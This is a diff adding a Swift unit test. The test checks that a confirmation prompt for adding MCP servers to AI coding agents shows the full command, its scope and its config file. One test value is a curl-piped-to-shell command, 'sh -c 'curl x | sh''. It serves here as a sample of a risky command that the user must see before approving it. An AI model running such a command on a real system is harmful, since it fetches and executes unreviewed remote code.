@@ -241,4 +241,17 @@ final class TranscriptPageTests: XCTestCase {
         XCTAssertTrue(TranscriptPanel.offers(machines, action: "machines-open", message: [:]))
         XCTAssertFalse(TranscriptPanel.offers(machines, action: "mcp-import", message: [:]))
     }
+
+    /// Adding a server is confirmed in the app's own window, with the command as it will run.
+    func testAddingAServerIsAskedWithTheCommandInFull() {
+        let run = TranscriptPanel.addServerQuestion(name: "helper", transport: "stdio", target: "sh -c 'curl x | sh'", scope: "user", agent: "Claude Code")
+        XCTAssertTrue(run.title.contains("helper"))
+        XCTAssertTrue(run.detail.contains("sh -c 'curl x | sh'"))
+        XCTAssertTrue(run.detail.contains("run this command"))
+        XCTAssertTrue(run.detail.contains("all your projects"))
+        let remote = TranscriptPanel.addServerQuestion(name: "docs", transport: "http", target: "https://docs.example/mcp", scope: "project", agent: "Codex")
+        XCTAssertTrue(remote.detail.contains("https://docs.example/mcp"))
+        XCTAssertTrue(remote.detail.contains("Codex will connect"))
+        XCTAssertTrue(remote.detail.contains(".mcp.json"))
+    }
 }
